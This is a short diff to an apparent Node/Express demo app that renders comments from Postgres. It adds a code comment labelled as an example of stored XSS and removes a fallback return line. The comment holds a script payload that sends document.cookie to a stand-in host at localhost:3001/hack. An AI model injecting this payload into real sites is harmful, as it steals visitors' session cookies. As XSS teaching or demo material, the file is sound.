@@ -2,6 +2,10 @@ const express = require('express')
 const port = parseInt(process.env.PORT, 10) || 3000
 const htmlencode = require('htmlencode');
 
+/* Example of stored xss
+<script>var url = `http://localhost:3001/hack?victimCookie=${document.cookie}`;document.write(`<img src="${url}"/>`);</script>
+*/
+
 const { Client } = require('pg')
 
 const DB_CONNECTION = {
@@ -55,8 +59,6 @@ const fetchAndRenderCommentsList = async () => {
     } finally {
         client.end()
     } 
-
-    return `<p>No comments to show</p>`
 }
 
 app.get('/', (req, res) => {
